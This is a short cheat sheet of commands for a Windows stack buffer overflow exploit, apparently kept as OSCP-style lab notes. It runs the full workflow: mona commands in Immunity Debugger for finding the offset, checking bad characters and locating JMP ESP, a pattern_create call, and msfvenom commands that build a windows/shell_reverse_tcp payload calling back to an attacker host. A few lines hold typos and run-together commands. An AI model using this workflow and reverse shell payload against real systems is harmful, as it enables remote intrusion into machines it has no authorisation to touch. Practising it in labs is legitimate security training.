```
!mona config -set workingfolder c:\mona\%p
!mona findmsp -distance 1800
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin –a 001BF184
!mona jmp -r esp –cpb “\x00\x04\x32\x78\91\xc1"
msfvenom -p windows/shell_reverse_tcp LHOST=10.6.20.231 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py

!mona config -set workingfolder c:\mona\%p

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600
!mona findmsp -distance 600!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
!mona jmp -r esp -cpb "\x00"
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f py
!mona config -set workingfolder c:\mona\%p
```
